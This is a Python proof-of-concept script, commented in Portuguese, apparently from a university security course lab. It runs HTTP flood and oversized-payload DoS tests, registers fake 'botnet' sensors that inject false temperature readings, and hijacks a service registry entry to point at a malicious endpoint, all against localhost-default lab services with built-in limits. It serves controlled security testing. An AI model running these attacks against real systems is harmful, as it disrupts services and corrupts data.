#!/usr/bin/env python3
"""
Script de testes de ataques (PoC) para o Projeto 1 de SSLE.

Ataques:
    A1 - DoS Flood
    A2 - DoS Payload
    B  - Botnet / Injeção de sensores falsos
    C  - Registry Hijacking
"""

import os
import sys
import time
import json
import csv
import argparse
import threading
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests


# ==================================================
# CONFIGURAÇÃO
# ==================================================

REGISTRY_URL = os.environ.get(
    "REGISTRY_URL",
    "http://localhost:5050"
).rstrip("/")

DEFAULT_INGESTION = os.environ.get(
    "INGESTION_URL",
    "http://localhost:5001"
).rstrip("/")

DEFAULT_STORAGE = os.environ.get(
    "STORAGE_URL",
    "http://localhost:5002"
).rstrip("/")

DEFAULT_STORAGE_ID = os.environ.get(
    "STORAGE_SERVICE_ID",
    "storage-001"
)

DEFAULT_TIMEOUT = 3

# Limites de segurança para experiências controladas.
MAX_REQUESTS = 5000
MAX_CONCURRENCY = 50
MAX_SENSORS = 100
MAX_REQUESTS_PER_SENSOR = 100
MAX_PAYLOAD_SIZE = 500_000


# ==================================================
# RECOLHA DE MÉTRICAS
# ==================================================

class AttackMetrics:

    def __init__(self, attack_name):
        self.attack_name = attack_name

        self.start_time = time.monotonic()
        self.end_time = None

        self.total_requests = 0
        self.success_count = 0

        self.status_codes = Counter()
        self.errors = Counter()
        self.phases = Counter()

        self.latencies = []

        self._lock = threading.Lock()

    def record_request(
        self,
        phase,
        status_code=None,
        error=None,
        latency=None
    ):
        with self._lock:
            self.total_requests += 1
            self.phases[phase] += 1

            if status_code is not None:
                self.status_codes[str(status_code)] += 1

                if 200 <= status_code < 300:
                    self.success_count += 1

            if error is not None:
                self.errors[type(error).__name__] += 1

            if latency is not None:
                self.latencies.append(latency)

    def finalize(self):
        self.end_time = time.monotonic()

    def to_dict(self):

        end = (
            self.end_time
            if self.end_time is not None
            else time.monotonic()
        )

        duration = end - self.start_time

        average_latency = (
            sum(self.latencies) / len(self.latencies)
            if self.latencies
            else 0
        )

        return {
            "attack_name": self.attack_name,
            "duration_seconds": round(duration, 4),
            "total_requests": self.total_requests,
            "success_count": self.success_count,
            "status_codes": dict(self.status_codes),
            "errors": dict(self.errors),
            "phases": dict(self.phases),
            "average_latency_ms": round(
                average_latency * 1000,
                2
            ),
            "requests_per_second": round(
                self.total_requests / duration,
                2
            ) if duration > 0 else 0
        }

    def print_summary(self):

        data = self.to_dict()

        print("\n" + "=" * 55)
        print(f" RELATÓRIO: {self.attack_name.upper()}")
        print("=" * 55)

        print(f"Duração:             {data['duration_seconds']} s")
        print(f"Pedidos:             {data['total_requests']}")
        print(f"Respostas HTTP 2xx:  {data['success_count']}")
        print(f"Pedidos/segundo:     {data['requests_per_second']}")
        print(f"Latência média:      {data['average_latency_ms']} ms")

        print(f"Códigos HTTP:        {data['status_codes']}")
        print(f"Erros:               {data['errors']}")
        print(f"Fases:               {data['phases']}")

        print("=" * 55 + "\n")


# ==================================================
# EXPORTAÇÃO DE RESULTADOS
# ==================================================

def export_json(metrics_list, filename):

    results = {
        "experiment": "SSLE Project 1",
        "generated_at": time.strftime(
            "%Y-%m-%d %H:%M:%S"
        ),
        "experiments": [
            metrics.to_dict()
            for metrics in metrics_list
        ]
    }

    with open(filename, "w", encoding="utf-8") as file:
        json.dump(
            results,
            file,
            indent=4,
            ensure_ascii=False
        )

    print(f"[+] Resultados JSON guardados em: {filename}")


def export_csv(metrics_list, filename):

    fieldnames = [
        "attack_name",
        "duration_seconds",
        "total_requests",
        "success_count",
        "average_latency_ms",
        "requests_per_second",
        "status_codes",
        "errors",
        "phases"
    ]

    file_exists = (
        os.path.isfile(filename)
        and os.path.getsize(filename) > 0
    )

    with open(
        filename,
        "a",
        newline="",
        encoding="utf-8"
    ) as file:

        writer = csv.DictWriter(
            file,
            fieldnames=fieldnames
        )

        if not file_exists:
            writer.writeheader()

        for metrics in metrics_list:

            data = metrics.to_dict()

            writer.writerow({
                "attack_name": data["attack_name"],
                "duration_seconds": data["duration_seconds"],
                "total_requests": data["total_requests"],
                "success_count": data["success_count"],
                "average_latency_ms": data["average_latency_ms"],
                "requests_per_second": data["requests_per_second"],
                "status_codes": json.dumps(data["status_codes"]),
                "errors": json.dumps(data["errors"]),
                "phases": json.dumps(data["phases"])
            })

    print(f"[+] Resultados CSV guardados em: {filename}")


# ==================================================
# FUNÇÕES AUXILIARES
# ==================================================

def send_request(
    metrics,
    phase,
    method,
    url,
    timeout=DEFAULT_TIMEOUT,
    **kwargs
):
    """
    Executa um pedido HTTP e regista o resultado.
    Devolve a resposta ou None em caso de erro.
    """

    start = time.monotonic()

    try:
        response = requests.request(
            method,
            url,
            timeout=timeout,
            **kwargs
        )

        latency = time.monotonic() - start

        metrics.record_request(
            phase=phase,
            status_code=response.status_code,
            latency=latency
        )

        return response

    except requests.Timeout as error:
        metrics.record_request(
            phase=phase,
            error=error,
            latency=time.monotonic() - start
        )

    except requests.ConnectionError as error:
        metrics.record_request(
            phase=phase,
            error=error,
            latency=time.monotonic() - start
        )

    except requests.RequestException as error:
        metrics.record_request(
            phase=phase,
            error=error,
            latency=time.monotonic() - start
        )

    return None


def discover_service(service_name, metrics=None):

    url = f"{REGISTRY_URL}/services/{service_name}"

    if metrics:
        response = send_request(
            metrics,
            "service_discovery",
            "GET",
            url
        )
    else:
        try:
            response = requests.get(
                url,
                timeout=DEFAULT_TIMEOUT
            )
        except requests.RequestException:
            return None

    if response is None or response.status_code != 200:
        return None

    try:
        service_url = response.json().get("url")

        if service_url:
            return service_url.rstrip("/")

    except ValueError:
        pass

    return None


def verify_positive(value, name, maximum=None):

    if value <= 0:
        raise ValueError(
            f"{name} tem de ser maior que zero."
        )

    if maximum is not None and value > maximum:
        raise ValueError(
            f"{name} não pode ultrapassar {maximum}."
        )


# ==================================================
# RAMO A1 - DOS FLOOD
# ==================================================

def attack_dos_flood(
    target_url,
    num_requests=300,
    concurrency=20,
    timeout=DEFAULT_TIMEOUT
):

    metrics = AttackMetrics("dos-flood")

    url = f"{target_url}/ingest"

    payload = {
        "device_id": "attacker-flood-device",
        "temperature": 22.5
    }

    print(
        f"[A1] DoS Flood: {num_requests} pedidos "
        f"com concorrência {concurrency}."
    )

    def worker():

        send_request(
            metrics,
            "ingestion",
            "POST",
            url,
            timeout=timeout,
            json=payload
        )

    with ThreadPoolExecutor(
        max_workers=concurrency
    ) as executor:

        futures = [
            executor.submit(worker)
            for _ in range(num_requests)
        ]

        for future in as_completed(futures):
            future.result()

    metrics.finalize()

    return metrics


# ==================================================
# RAMO A2 - DOS PAYLOAD
# ==================================================

def attack_dos_payload(
    target_url,
    timeout=DEFAULT_TIMEOUT,
    payload_size=MAX_PAYLOAD_SIZE
):

    metrics = AttackMetrics("dos-payload")

    url = f"{target_url}/ingest"

    print("[A2] Testes controlados de payload.")

    # --------------------------------------------------
    # Teste 1: limite funcional do device_id
    # --------------------------------------------------

    print(
        "[A2] Teste 1: device_id com 200 caracteres. "
        "Esperada rejeição HTTP 400."
    )

    response = send_request(
        metrics,
        "oversized_device_id",
        "POST",
        url,
        timeout=timeout,
        json={
            "device_id": "A" * 200,
            "temperature": 25.0
        }
    )

    if response is not None:
        print(
            f"     Resultado: HTTP {response.status_code}"
        )

    # --------------------------------------------------
    # Teste 2: tamanho total do JSON
    # --------------------------------------------------

    print(
        f"[A2] Teste 2: JSON com campo adicional "
        f"de {payload_size} caracteres."
    )

    response = send_request(
        metrics,
        "large_request_body",
        "POST",
        url,
        timeout=timeout,
        json={
            "device_id": "stress-device",
            "temperature": 25.0,
            "junk": "B" * payload_size
        }
    )

    if response is not None:
        print(
            f"     Resultado: HTTP {response.status_code}"
        )

    metrics.finalize()

    return metrics


# ==================================================
# RAMO B - BOTNET
# ==================================================

def attack_botnet(
    num_sensors=10,
    requests_per_sensor=5,
    ingestion_url=None,
    storage_url=None
):

    metrics = AttackMetrics("botnet")

    ingestion_url = (
        ingestion_url
        or discover_service("ingestion-service")
        or DEFAULT_INGESTION
    )

    print(
        f"[B] Botnet: {num_sensors} sensores, "
        f"{requests_per_sensor} leituras por sensor."
    )

    def simulate_sensor(sensor_idx):

        sensor_id = (
            f"bot-sensor-aveiro-{sensor_idx:03d}"
        )

        # --------------------------------------------------
        # 1. Registo do sensor falso
        # --------------------------------------------------

        registration_payload = {
            "service_id": sensor_id,
            "name": "sensor",
            "url": "none",
            "type": "sensor",
            "country": "pt",
            "region": "aveiro",
            "dc": "dc1",
            "rack": "r99",
            "node": "n99"
        }

        registration_response = send_request(
            metrics,
            "sensor_registration",
            "POST",
            f"{REGISTRY_URL}/register",
            json=registration_payload
        )

        if (
            registration_response is not None
            and registration_response.status_code < 200
            or registration_response is not None
            and registration_response.status_code >= 300
        ):
            print(
                f"[B] Registo do sensor {sensor_id} "
                f"não aceite: HTTP "
                f"{registration_response.status_code}"
            )

        # --------------------------------------------------
        # 2. Envio de leituras falsas
        # --------------------------------------------------

        for index in range(requests_per_sensor):

            payload = {
                "device_id": sensor_id,
                "temperature": 75.5 + (index * 0.5)
            }

            response = send_request(
                metrics,
                "fake_temperature_injection",
                "POST",
                f"{ingestion_url}/ingest",
                json=payload
            )

            if response is not None and not response.ok:
                print(
                    f"[B] Leitura rejeitada para {sensor_id}: "
                    f"HTTP {response.status_code}"
                )

            time.sleep(0.1)

    # Concorrência limitada para evitar sobrecarga
    # desnecessária do ambiente de laboratório.

    with ThreadPoolExecutor(max_workers=5) as executor:

        futures = [
            executor.submit(simulate_sensor, index)
            for index in range(num_sensors)
        ]

        for future in as_completed(futures):
            future.result()

    # --------------------------------------------------
    # 3. Verificação no Storage
    # --------------------------------------------------

    if storage_url:

        print("[B] A verificar dados no Storage...")

        response = send_request(
            metrics,
            "storage_verification",
            "GET",
            f"{storage_url}/temperatures"
        )

        if response is not None and response.status_code == 200:

            try:
                records = response.json()

                # Compatibilidade com respostas que sejam
                # uma lista ou um objeto com lista interna.

                if isinstance(records, dict):
                    for key in (
                        "temperatures",
                        "data",
                        "records"
                    ):
                        if isinstance(records.get(key), list):
                            records = records[key]
                            break

                if isinstance(records, list):

                    bot_records = [
                        record
                        for record in records
                        if isinstance(record, dict)
                        and str(
                            record.get("device_id", "")
                        ).startswith("bot-sensor-")
                    ]

                    print(
                        f"[B] Registos Botnet encontrados: "
                        f"{len(bot_records)}"
                    )

                else:
                    print(
                        "[B] Formato da resposta do Storage "
                        "não reconhecido."
                    )

            except ValueError:
                print(
                    "[B] Storage devolveu uma resposta "
                    "que não é JSON válido."
                )

    metrics.finalize()

    return metrics


# ==================================================
# RAMO C - REGISTRY HIJACKING
# ==================================================

def attack_registry_hijack(
    target_service_id,
    malicious_url
):

    metrics = AttackMetrics("registry-hijack")

    print(
        f"[C] Tentativa de Registry Hijacking "
        f"para {target_service_id}."
    )

    payload = {
        "service_id": target_service_id,
        "name": "storage-service",
        "url": malicious_url,
        "type": "storage",
        "country": "pt",
        "region": "aveiro",
        "dc": "dc1",
        "rack": "r01",
        "node": "n01"
    }

    # --------------------------------------------------
    # 1. Tentativa de sobrescrita
    # --------------------------------------------------

    response = send_request(
        metrics,
        "registry_overwrite",
        "POST",
        f"{REGISTRY_URL}/register",
        json=payload
    )

    if response is None:
        print("[C] Não foi possível contactar o Registry.")
        metrics.finalize()
        return metrics

    print(
        f"[C] Resposta do registo: HTTP {response.status_code}"
    )

    if not response.ok:
        print("[C] O Registry rejeitou o registo.")
        metrics.finalize()
        return metrics

    # --------------------------------------------------
    # 2. Verificação do endpoint registado
    # --------------------------------------------------

    print("[C] A verificar descoberta do Storage...")

    discovery_response = send_request(
        metrics,
        "registry_discovery_verification",
        "GET",
        f"{REGISTRY_URL}/services/storage-service"
    )

    if (
        discovery_response is not None
        and discovery_response.status_code == 200
    ):

        try:
            discovered_url = (
                discovery_response.json().get("url")
            )

            print(
                f"[C] URL devolvido pelo Registry: "
                f"{discovered_url}"
            )

            if discovered_url == malicious_url:
                print(
                    "[C] SUCESSO: o Registry devolveu "
                    "o endpoint malicioso."
                )
            else:
                print(
                    "[C] O Registry não devolveu "
                    "o endpoint pretendido."
                )

        except ValueError:
            print(
                "[C] Resposta do Registry não é JSON válido."
            )

    else:
        print(
            "[C] Não foi possível confirmar a descoberta."
        )

    print(
        "[C] Nota: o Ingestion pode manter o URL legítimo "
        "na cache durante até 10 segundos. A alteração "
        "do Registry não prova, por si só, que o consumidor "
        "já comunicou com o endpoint malicioso."
    )

    metrics.finalize()

    return metrics


# ==================================================
# ARGUMENTOS CLI
# ==================================================

def parse_arguments():

    parser = argparse.ArgumentParser(
        description=(
            "Script de PoC de ataques para o Projeto 1 SSLE"
        )
    )

    parser.add_argument(
        "mode",
        choices=[
            "dos-flood",
            "dos-payload",
            "botnet",
            "hijack",
            "all"
        ],
        help="Ataque a executar."
    )

    parser.add_argument(
        "--ingestion",
        default=DEFAULT_INGESTION,
        help="URL do Ingestion."
    )

    parser.add_argument(
        "--storage",
        default=DEFAULT_STORAGE,
        help="URL do Storage."
    )

    parser.add_argument(
        "--requests",
        type=int,
        default=300,
        help="Número de pedidos do DoS Flood."
    )

    parser.add_argument(
        "--concurrency",
        type=int,
        default=20,
        help="Concorrência do DoS Flood."
    )

    parser.add_argument(
        "--sensors",
        type=int,
        default=10,
        help="Número de sensores da Botnet."
    )

    parser.add_argument(
        "--requests-per-sensor",
        type=int,
        default=5,
        help="Número de leituras por sensor."
    )

    parser.add_argument(
        "--timeout",
        type=float,
        default=DEFAULT_TIMEOUT,
        help="Timeout HTTP em segundos."
    )

    parser.add_argument(
        "--payload-size",
        type=int,
        default=MAX_PAYLOAD_SIZE,
        help="Tamanho do campo adicional do payload."
    )

    parser.add_argument(
        "--storage-id",
        default=DEFAULT_STORAGE_ID,
        help="Service ID real do Storage no Registry."
    )

    parser.add_argument(
        "--malicious-url",
        default="http://malicious-node.incus:6666",
        help="URL do endpoint malicioso para o hijacking."
    )

    parser.add_argument(
        "--format",
        choices=["json", "csv"],
        default=None,
        help="Formato de exportação."
    )

    parser.add_argument(
        "--output",
        default=None,
        help="Nome do ficheiro de resultados."
    )

    args = parser.parse_args()

    verify_positive(
        args.requests,
        "--requests",
        MAX_REQUESTS
    )

    verify_positive(
        args.concurrency,
        "--concurrency",
        MAX_CONCURRENCY
    )

    verify_positive(
        args.sensors,
        "--sensors",
        MAX_SENSORS
    )

    verify_positive(
        args.requests_per_sensor,
        "--requests-per-sensor",
        MAX_REQUESTS_PER_SENSOR
    )

    verify_positive(
        args.timeout,
        "--timeout"
    )

    verify_positive(
        args.payload_size,
        "--payload-size",
        MAX_PAYLOAD_SIZE
    )

    if not args.storage_id.strip():
        parser.error("--storage-id não pode estar vazio.")

    return args


# ==================================================
# MAIN
# ==================================================

def main():

    args = parse_arguments()

    print("\n========================================")
    print(" SSLE - EXPERIMENTAÇÃO DE ATAQUES")
    print("========================================")
    print(f"Modo:       {args.mode}")
    print(f"Registry:   {REGISTRY_URL}")
    print(f"Ingestion:  {args.ingestion}")
    print(f"Storage:    {args.storage}")
    print("========================================\n")

    executed_metrics = []

    # --------------------------------------------------
    # Descoberta dos serviços
    # --------------------------------------------------

    ingestion_url = (
        discover_service("ingestion-service")
        or args.ingestion
    )

    storage_url = (
        discover_service("storage-service")
        or args.storage
    )

    if args.mode in ("dos-flood", "all"):

        metrics = attack_dos_flood(
            ingestion_url,
            num_requests=args.requests,
            concurrency=args.concurrency,
            timeout=args.timeout
        )

        metrics.print_summary()
        executed_metrics.append(metrics)

    if args.mode in ("dos-payload", "all"):

        metrics = attack_dos_payload(
            ingestion_url,
            timeout=args.timeout,
            payload_size=args.payload_size
        )

        metrics.print_summary()
        executed_metrics.append(metrics)

    if args.mode in ("botnet", "all"):

        metrics = attack_botnet(
            num_sensors=args.sensors,
            requests_per_sensor=args.requests_per_sensor,
            ingestion_url=ingestion_url,
            storage_url=storage_url
        )

        metrics.print_summary()
        executed_metrics.append(metrics)

    if args.mode in ("hijack", "all"):

        metrics = attack_registry_hijack(
            target_service_id=args.storage_id,
            malicious_url=args.malicious_url
        )

        metrics.print_summary()
        executed_metrics.append(metrics)

    # --------------------------------------------------
    # Exportação
    # --------------------------------------------------

    if args.format:

        filename = args.output

        if not filename:
            filename = (
                "attack_results.json"
                if args.format == "json"
                else "attack_results.csv"
            )

        if args.format == "json":
            export_json(
                executed_metrics,
                filename
            )

        elif args.format == "csv":
            export_csv(
                executed_metrics,
                filename
            )

    print("\n[+] Execução concluída.\n")


if __name__ == "__main__":

    try:
        main()

    except ValueError as error:
        print(f"[ERRO] {error}")
        sys.exit(1)

    except KeyboardInterrupt:
        print("\n[!] Execução interrompida pelo utilizador.")
        sys.exit(130)
